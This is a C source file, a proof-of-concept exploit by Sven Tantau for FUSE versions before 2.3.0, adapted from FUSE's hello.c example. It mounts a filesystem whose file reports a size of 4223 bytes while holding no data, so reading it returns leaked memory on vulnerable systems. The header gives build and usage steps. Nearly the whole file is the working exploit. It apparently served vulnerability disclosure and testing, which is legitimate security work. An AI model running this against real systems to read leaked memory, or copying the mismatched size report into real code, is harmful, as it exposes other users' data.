/*
    memfs.c: Proof of concept exploit for FUSE < 2.3.0
    
    memfs.c is based on fuse/example/hello.c from Miklos Szeredi
    
    Details: http://www.sven-tantau.de/public_files/fuse/fuse_20050603.txt
    
    Build: Copy memfs.c over hello.c and run make in the fuse base directory
    
    Usage: Create a mountpoint ; ./hello /mnt/getmem/ ; cat /mnt/getmem/memfs ;
           If you see random bytes you are vulnerable.
           
    Sven Tantau - http://www.sven-tantau.de/ - 01.06.2005
    
    
    
    FUSE: Filesystem in Userspace
    Copyright (C) 2001-2005  Miklos Szeredi <miklos@szeredi.hu>

    This program can be distributed under the terms of the GNU GPL.
*/

#define FUSE_USE_VERSION 28

#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>


static const char *memfs_str = "";
static const char *memfs_path = "/memfs";

static int memfs_getattr(const char *path, struct stat *stbuf)
{
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));
    if(strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    }
    else if(strcmp(path, memfs_path) == 0) {
        stbuf->st_mode = S_IFREG | 0444;
        stbuf->st_nlink = 1;
        stbuf->st_size = 4223;
    }
    else
        res = -ENOENT;

    return res;
}

static int memfs_getdir(const char *path, fuse_dirh_t h, fuse_dirfil_t filler)
{
    if(strcmp(path, "/") != 0)
        return -ENOENT;

    filler(h, ".", 0, 0);
    filler(h, "..", 0, 0);
    filler(h, memfs_path + 1, 0, 0);

    return 0;
}

static int memfs_open(const char *path, struct fuse_file_info *fi)
{
    if(strcmp(path, memfs_path) != 0)
        return -ENOENT;

    if((fi->flags & 3) != O_RDONLY)
        return -EACCES;

    return 0;
}

static int memfs_read(const char *path, char *buf, size_t size, off_t offset,
                      struct fuse_file_info *fi)
{
    size_t len;
    (void) fi;
    if(strcmp(path, memfs_path) != 0)
        return -ENOENT;

    len = strlen(memfs_str);
    if (offset < len) {
        if (offset + size > len)
            size = len - offset;
        memcpy(buf, memfs_str + offset, size);
    } else
        size = 0;

    return size;
}

static struct fuse_operations memfs_oper = {
    .getattr	= memfs_getattr,
    .getdir	= memfs_getdir,
    .open	= memfs_open,
    .read	= memfs_read,
};

int main(int argc, char *argv[])
{
    return fuse_main(argc, argv, &memfs_oper,NULL);
}
